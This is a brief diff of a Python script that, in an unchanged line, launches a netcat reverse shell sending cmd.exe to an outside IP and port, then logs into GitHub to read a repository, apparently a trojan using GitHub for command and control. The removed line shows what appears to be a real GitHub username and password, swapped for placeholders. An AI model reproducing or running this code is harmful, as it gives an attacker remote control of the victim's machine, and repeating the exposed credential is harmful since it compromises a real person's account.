@@ -3,7 +3,7 @@ def run():
   import os
   os.system('nc -e cmd.exe  172.16.32.138 8080')
   from github import Github
-g = Github("juanangelLerida", "J.angel14enero")
+g = Github("username", "password")
 
 repo = g.get_user().get_repo(GITHUB_REPO)
 all_files = []
